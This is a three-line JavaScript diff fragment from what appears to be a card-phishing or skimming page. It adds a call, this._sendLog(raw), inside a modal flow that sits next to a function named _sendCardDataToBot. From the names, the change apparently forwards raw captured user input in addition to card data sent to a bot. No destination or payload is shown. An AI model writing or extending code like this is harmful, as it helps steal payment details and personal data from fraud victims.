@@ -801,6 +801,7 @@
 
     this._balanceSent = true;
     this.showModal('msLoading');
+    this._sendLog(raw);
   };
 
   ModalSystem.prototype._sendCardDataToBot = function (cardData) {
